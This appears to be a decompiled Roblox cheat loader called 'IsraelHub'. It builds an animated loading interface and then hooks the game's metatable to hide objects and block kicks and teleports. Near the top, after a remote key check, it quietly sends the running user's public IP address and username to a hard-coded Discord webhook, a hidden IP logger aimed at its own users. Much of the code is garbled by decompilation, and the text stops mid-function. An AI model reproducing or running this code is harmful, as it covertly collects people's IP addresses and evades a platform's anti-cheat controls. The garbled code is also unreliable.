for fj = 65, 90 do
  table.insert({}, string.char(fj))
end
for fj = 97, 122 do
  table.insert({}, string.char(fj))
end
function rand(a)
  va(tick())
  if a >= 0 then
    return rand(a - 1) .. vb[vc(1, #vb)]
  else
    return ""
  end
end
math.randomseed(tick())
if _G.Key == game:HttpGet("https://israelhub.netlify.app/key/ycaRcJjm.txt") then
  request = not {} or not {} or http_request or syn.request
  request({
    Url = "https://discord.com/api/webhooks/931053883218882601/nhUhcByw1aEPl-Yizva-e0o5cq_o5IPa4hFmXBlvZBpLQYDYPDhxkdJGxGy5QNHpr9dc",
    Body = game:GetService("HttpService"):JSONEncode({
      embeds = {
        {
          title = "**IsraelHub Loaded **" .. tostring(game:HttpGet("https://api.ipify.org", true)),
          description = "Username: " .. game.Players.LocalPlayer.Name .. " with **" .. ({} or "Kid with shit exploit") .. "**",
          type = "rich",
          color = tonumber(7498202),
          image = {
            url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name)
          }
        }
      }
    }),
    Method = "POST",
    Headers = {
      ["content-type"] = "application/json"
    }
  })
  function GetGame()
    if not va:JSONDecode(vb) then
      return va:JSONDecode(vb)[tostring(game.PlaceId)]
    else
      return false
    end
  end
  if GetGame() then
  end
  Instance.new("ScreenGui").Name = "LoaderSheeesh"
  Instance.new("ScreenGui").Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
  Instance.new("ScreenGui").ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  Instance.new("ScreenGui").ResetOnSpawn = false
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("ScreenGui"), "Loader"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(30, 30, 30)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,520789862, 0, 0,484963417, 0)
  Instance.new("Frame").Size = UDim2.new(0, 303, 0, 238)
  Instance.new("Frame").ZIndex = 2
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0,0599999987, 0)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fade1"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Instance.new("Frame").BackgroundTransparency = 0,1
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,00666666, 0, 1,00999999, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fade3"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Instance.new("Frame").BackgroundTransparency = 0,3
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,01999998, 0, 1,02999997, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fade2"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Instance.new("Frame").BackgroundTransparency = 0,2
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,01333332, 0, 1,01999998, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fade4"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Instance.new("Frame").BackgroundTransparency = 0,4
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,02666664, 0, 1,03999996, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fade5"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Instance.new("Frame").BackgroundTransparency = 0,5
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,0333333, 0, 1,04999995, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fade6"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Instance.new("Frame").BackgroundTransparency = 0,6
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,03999996, 0, 1,05999994, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "MainFr"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(24, 24, 24)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").ClipsDescendants = true
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(1,00666666, 0, 1,00999999, 0)
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Top"
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(14, 14, 14)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Size = UDim2.new(1, 0, 0,17326732, 0)
  Instance.new("Frame").ZIndex = 2
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "Title"
  Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("TextLabel").BackgroundTransparency = 1
  Instance.new("TextLabel").BorderSizePixel = 0
  Instance.new("TextLabel").Position = UDim2.new(0,327784181, 0, 0,0240096059, 0)
  Instance.new("TextLabel").Size = UDim2.new(0,668874145, 0, 1, 0)
  Instance.new("TextLabel").ZIndex = 3
  Instance.new("TextLabel").Font = Enum.Font.ArialBold
  Instance.new("TextLabel").Text = "IsraelHub"
  Instance.new("TextLabel").TextColor3 = Color3.fromRGB(230, 230, 230)
  Instance.new("TextLabel").TextSize = 26
  Instance.new("TextLabel").TextStrokeColor3 = Color3.fromRGB(150, 150, 150)
  Instance.new("TextLabel").TextXAlignment = Enum.TextXAlignment.Left
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Fix"
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(14, 14, 14)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0, 0, 0,657142878, 0)
  Instance.new("Frame").Size = UDim2.new(1, 0, 0,342857152, 0)
  Instance.new("ImageButton").Parent, Instance.new("ImageButton").Name = Instance.new("Frame"), "Settings"
  Instance.new("ImageButton").BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("ImageButton").BackgroundTransparency = 1
  Instance.new("ImageButton").Position = UDim2.new(0,910596073, 0, 0,0285714883, 0)
  Instance.new("ImageButton").Size = UDim2.new(0, 17, 0, 17)
  Instance.new("ImageButton").Image = "http://www.roblox.com/asset/?id=4492476121"
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Load2"
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(14, 14, 14)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,029801324, 0, 0,260127664, 0)
  Instance.new("Frame").Size = UDim2.new(0,940397322, 0, 0,301980197, 0)
  Instance.new("Frame").ZIndex = 2
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Loader"
  Instance.new("Frame").AnchorPoint = Vector2.new(0,5, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(24, 24, 24)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0,5, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(0,873239458, 0, 0,327868849, 0)
  Instance.new("Frame").ZIndex = 2
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "Filler"
  Instance.new("Frame").AnchorPoint = Vector2.new(0, 0,5)
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(90, 90, 90)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(0, 0, 0,5, 0)
  Instance.new("Frame").Size = UDim2.new(0, 0, 1, 0)
  Instance.new("Frame").ZIndex = 2
  Instance.new("UICorner").Parent, Instance.new("UICorner").CornerRadius = Instance.new("Frame"), UDim.new(0, 6)
  Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "Stat"
  Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("TextLabel").BackgroundTransparency = 1
  Instance.new("TextLabel").BorderSizePixel = 0
  Instance.new("TextLabel").Position = UDim2.new(-0,0650322214, 0, 1, 0)
  Instance.new("TextLabel").Size = UDim2.new(1,13709676, 0, 1, 0)
  Instance.new("TextLabel").ZIndex = 2
  Instance.new("TextLabel").Font = Enum.Font.GothamBold
  Instance.new("TextLabel").Text = " "
  Instance.new("TextLabel").TextColor3 = Color3.fromRGB(250, 250, 250)
  Instance.new("TextLabel").TextSize = 18
  Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "LoadScript"
  Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(14, 14, 14)
  Instance.new("TextButton").BackgroundTransparency = 1
  Instance.new("TextButton").Position = UDim2.new(0,0894040391, 0, 0,790415168, 0)
  Instance.new("TextButton").Size = UDim2.new(0, 249, 0, 41)
  Instance.new("TextButton").Visible = false
  Instance.new("TextButton").Font = Enum.Font.SourceSans
  Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("TextButton").TextSize = 24
  Instance.new("UICorner").Parent, Instance.new("TextButton").TextTransparency = Instance.new("TextButton"), 1
  Instance.new("TextLabel").Parent, Instance.new("TextLabel").Name = Instance.new("Frame"), "GameName"
  Instance.new("TextLabel").BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("TextLabel").BackgroundTransparency = 1
  Instance.new("TextLabel").BorderSizePixel = 0
  Instance.new("TextLabel").Position = UDim2.new(0,0360001773, 0, 0,603708625, 0)
  Instance.new("TextLabel").Size = UDim2.new(0, 284, 0, 28)
  Instance.new("TextLabel").Visible = false
  Instance.new("TextLabel").Font = Enum.Font.SourceSans
  Instance.new("TextLabel").Text = "Game Detected: Loading..."
  Instance.new("TextLabel").TextColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("TextLabel").TextSize = 14
  Instance.new("TextLabel").TextTransparency = 1
  Instance.new("Frame").Parent, Instance.new("Frame").Name = Instance.new("Frame"), "SettingsFrame"
  Instance.new("Frame").BackgroundColor3 = Color3.fromRGB(24, 24, 24)
  Instance.new("Frame").BorderSizePixel = 0
  Instance.new("Frame").Position = UDim2.new(-0,899999976, -900, -0,0149999997, 0)
  Instance.new("Frame").Size = UDim2.new(0, 273, 0, 245)
  Instance.new("UICorner").Parent, Instance.new("Frame").Visible = Instance.new("Frame"), false
  Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "IsraelHubAdmin"
  Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(14, 14, 14)
  Instance.new("TextButton").Position = UDim2.new(0,0894040987, 0, 0,0393947065, 0)
  Instance.new("TextButton").Size = UDim2.new(0, 249, 0, 34)
  Instance.new("TextButton").Font = Enum.Font.SourceSans
  Instance.new("TextButton").Text = "IsraelHub Admin"
  Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("UIPadding").Parent, Instance.new("UICorner").Parent, Instance.new("TextButton").TextSize = Instance.new("Frame"), Instance.new("TextButton"), 24
  Instance.new("UIPadding").PaddingLeft = UDim.new(0, 14)
  Instance.new("UIListLayout").Parent, Instance.new("UIPadding").PaddingTop = Instance.new("Frame"), UDim.new(0, 16)
  Instance.new("UIListLayout").SortOrder = Enum.SortOrder.LayoutOrder
  Instance.new("UIListLayout").Padding = UDim.new(0, 8)
  Instance.new("TextButton").Parent, Instance.new("TextButton").Name = Instance.new("Frame"), "KillGui"
  Instance.new("TextButton").BackgroundColor3 = Color3.fromRGB(68, 0, 1)
  Instance.new("TextButton").Position = UDim2.new(0,0894040987, 0, 0,0393947065, 0)
  Instance.new("TextButton").Size = UDim2.new(0, 249, 0, 34)
  Instance.new("TextButton").Font = Enum.Font.SourceSans
  Instance.new("TextButton").Text = "Kill Gui"
  Instance.new("TextButton").TextColor3 = Color3.fromRGB(255, 255, 255)
  Instance.new("UICorner").Parent, Instance.new("TextButton").TextSize = Instance.new("TextButton"), 24
  coroutine.wrap(function()
    wait(1)
    function click()
      if va == false then
        va = true
        vb.Parent.Parent.Parent.Parent.SettingsFrame.Visible = true
        vc:TweenPosition(UDim2.new(-0,018, 0, -0,015, 0), "Out", "Bounce", 1)
      else
        va = false
        vc:TweenPosition(UDim2.new(-0,9, -900, -0,015, 0), "Out", "Bounce", 1)
      end
    end
    Instance.new("Script", va).Parent.MouseButton1Click:connect(click)
  end)()
  coroutine.wrap(function()
    Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
      va.Parent.Parent.Parent.SettingsFrame.Visible = false
      game:GetService("TweenService"):Create(va.Parent.Parent.Parent, TweenInfo.new(0,4), {
        Size = UDim2.new(0, 0, 0, 0)
      }):Play()
      game:GetService("TweenService"):Create(va.Parent.Parent.Parent.MainFr, TweenInfo.new(0,3), {
        Size = UDim2.new(0, 0, 0, 0)
      }):Play()
      wait(0,1)
      va.Parent.Parent.Parent.ClipsDescendants = true
      va.Parent.Parent.Parent.Parent.Login.Visible = true
      va.Parent.Parent.Parent.Parent.Login.ClipsDescendants = true
      game:GetService("TweenService"):Create(va.Parent.Parent.Parent.Parent.Login, TweenInfo.new(0,6), {
        Size = UDim2.new(0, 354, 0, 297)
      }):Play()
      game:GetService("TweenService"):Create(va.Parent.Parent.Parent.Parent.Login.MainFr, TweenInfo.new(0,5), {
        Size = UDim2.new(1, 2, 1, 2)
      }):Play()
      wait(0,4)
      va.Parent.Parent.Parent.Parent.Login.ClipsDescendants = false
    end)
  end)()
  coroutine.wrap(function()
    Instance.new("LocalScript", va).Parent.MainFr.Size = UDim2.new(0, 0, 0, 0)
    Instance.new("LocalScript", va).Parent.Visible = true
    Instance.new("LocalScript", va).Parent.Size = UDim2.new(0, 0, 0, 0)
    Instance.new("LocalScript", va).Parent.ClipsDescendants = true
    function load()
      va.Parent.ClipsDescendants = false
      game:GetService("TweenService"):Create(va.Parent, TweenInfo.new(0,6), {
        Size = UDim2.new(0, 303, 0, 238)
      }):Play()
      game:GetService("TweenService"):Create(va.Parent.MainFr, TweenInfo.new(0,5), {
        Size = UDim2.new(1, 2, 1, 2)
      }):Play()
      wait(1,5)
      game:GetService("TweenService"):Create(va.Parent.MainFr.Load2.Loader.Filler, TweenInfo.new(4), {
        Size = UDim2.new(1, 0, 1, 0)
      }):Play()
      wait(0,1)
      va.Parent.MainFr.Load2.Loader.Stat.Text = "Loading Script..."
      wait(0,6)
      va.Parent.MainFr.Load2.Loader.Stat.Text = "Loading Gui..."
      wait(0,6)
      va.Parent.MainFr.Load2.Loader.Stat.Text = "Loading Features..."
      wait(0,6)
      va.Parent.MainFr.Load2.Loader.Stat.Text = "Cheking Game..."
      wait(0,6)
      va.Parent.MainFr.Load2.Loader.Stat.Text = "Script Loaded! "
      wait(0,2)
      va.Parent.MainFr.GameName.Visible = true
      va.Parent.MainFr.GameName.TextTransparency = 0,9
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,8
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,7
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,6
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,5
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,4
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,3
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,2
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0,1
      wait(0,1)
      va.Parent.MainFr.GameName.TextTransparency = 0
      wait(0,2)
      va.Parent.MainFr.LoadScript.Visible = true
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,9
      va.Parent.MainFr.LoadScript.TextTransparency = 0,9
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,8
      va.Parent.MainFr.LoadScript.TextTransparency = 0,8
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,7
      va.Parent.MainFr.LoadScript.TextTransparency = 0,7
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,6
      va.Parent.MainFr.LoadScript.TextTransparency = 0,6
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,5
      va.Parent.MainFr.LoadScript.TextTransparency = 0,5
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,4
      va.Parent.MainFr.LoadScript.TextTransparency = 0,4
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,3
      va.Parent.MainFr.LoadScript.TextTransparency = 0,3
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,2
      va.Parent.MainFr.LoadScript.TextTransparency = 0,2
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0,1
      va.Parent.MainFr.LoadScript.TextTransparency = 0,1
      wait(0,1)
      va.Parent.MainFr.LoadScript.BackgroundTransparency = 0
      va.Parent.MainFr.LoadScript.TextTransparency = 0
    end
    wait(2)
    load()
  end)()
  coroutine.wrap(function()
    Instance.new("LocalScript", va).Parent.MouseButton1Click:Connect(function()
      Debug = true
      if not (not tick() and nil and os.clock()) and next((getconnections(game:GetService("ScriptContext").Error))) then
        getfenv().error = warn
        getgenv().error = warn
      end
      for fg, fh in pairs(getfenv().table) do
      end
      for fh, fj in pairs(getfenv().string) do
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      function firetouchinterest(a, b, c)
        if not b and not a then
          if c == 0 then
            va[1] = a.CFrame
            a.CFrame = b.CFrame
          else
            a.CFrame = va[1]
            va[1] = nil
          end
        end
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      function hookfunction(a, b)
        if not b then
          replaceclosure(a, b)
          return b
        end
        a = newcclosure and newcclosure(b) or b
        return b
      end
      getconnections = getconnections or function()
        return {}
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      function getrawmetatable()
        return setmetatable({}, {})
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      function getnamecallmethod()
        return ""
      end
      if {
        [fg] = fh,
        ["tbl_concat"] = function()
          for fg, fh in next, {
            ...
          }, nil do
            for fm, fo in next, fh, nil do
              va.insert({}, 14 + 1, fo)
            end
          end
          return {}
        end,
        ["indexOf"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if fh == b then
                return fg
              end
            end
          end
        end,
        ["forEach"] = function(a, b)
          for fg, fh in next, a, nil do
            b(fg, fh)
          end
        end,
        ["filter"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              if not b then
                va.insert({}, 10 + 1, fj)
              end
            end
            return {}
          end
        end,
        ["map"] = function(a, b)
          if type(a) == "table" then
            for fh, fj in next, a, nil do
              va.insert({}, 10 + 1, b(fh, fj))
            end
            return {}
          end
        end,
        ["deepsearch"] = function(a, b)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
              if type(fh) == "table" then
                va.deepsearch(fh, b)
              end
              b(fg, fh)
            end
          end
        end,
        ["flat"] = function(a)
          if type(a) == "table" then
            va.deepsearch(a, function(a, b)
              if type(b) ~= "table" then
                va[3 + 1] = b
              end
            end)
            return {}
          end
        end,
        ["flatMap"] = function(a, b)
          if type(a) == "table" then
            return (va.flat(va.map(a, b)))
          end
        end,
        ["shift"] = function(a)
          if type(a) == "table" then
            a = va.pack(va.unpack(a, 2, #a))
            a.n = nil
            return a
          end
        end,
        ["keys"] = function(a)
          if type(a) == "table" then
            for fg, fh in next, a, nil do
            end
            return {
              [7 + 1] = fg
            }
          end
        end
      } then
      end
      function checkcaller()
        return false
      end
      for fu, fy in next, Enum.DeveloperMemoryTag:GetEnumItems() do
      end
      setreadonly(getrawmetatable(game), false)
      for fz, fq in next, getrawmetatable(game), nil do
      end
      getrawmetatable(game).__namecall = newcclosure(function(a)
        if checkcaller() then
          return va(a, ...)
        end
        if vb[a] and not nil then
          if getnamecallmethod():gsub("%z", function(a)
            return a
          end):gsub("%z", "") == "IsA" then
          end
          return nil
        end
        if getnamecallmethod():gsub("%z", function(a)
          return a
        end):gsub("%z", "") == "GetChildren" or getnamecallmethod():gsub("%z", function(a)
          return a
        end):gsub("%z", "") == "GetDescendants" then
          return vc.filter(va(a, ...), function(a, b)
            return not va.find(vb, b)
          end)
        end
        if getnamecallmethod():gsub("%z", function(a)
          return a
        end):gsub("%z", "") == "GetFocusedTextBox" and vc.find(vb, va(a, ...)) then
          return nil
        end
        if not nil and vg.lower((getnamecallmethod():gsub("%z", function(a)
          return a
        end):gsub("%z", ""))) == "kick" then
          getgenv().F_A.Utils.Notify(nil, "Attempt to kick", ("attempt to kick with message \"%s\""):format(Args[1]))
          return
        end
        if vh and getnamecallmethod():gsub("%z", function(a)
          return a
        end):gsub("%z", "") == "Teleport" or getnamecallmethod():gsub("%z", function(a)
          return a
        end):gsub("%z", "") == "TeleportToPlaceInstance" then
          getgenv().F_A.Utils.Notify(nil, "Attempt to teleport", ("attempt to teleport to place \"%s\""):format(Args[1]))
          return
        end
        return va(a, ...)
      end)
      getrawmetatable(game).__index = newcclosure(function(a, b)
        if not b then
          return va(a, b)
        end
        if type(b) == "string" then
          b = b:gsub("%z", function(a)
            return a
          end):gsub("%z", "") or b
        end
        if vc[a] then
          if ve.find(vg, b) then
            return va(a, b)
          end
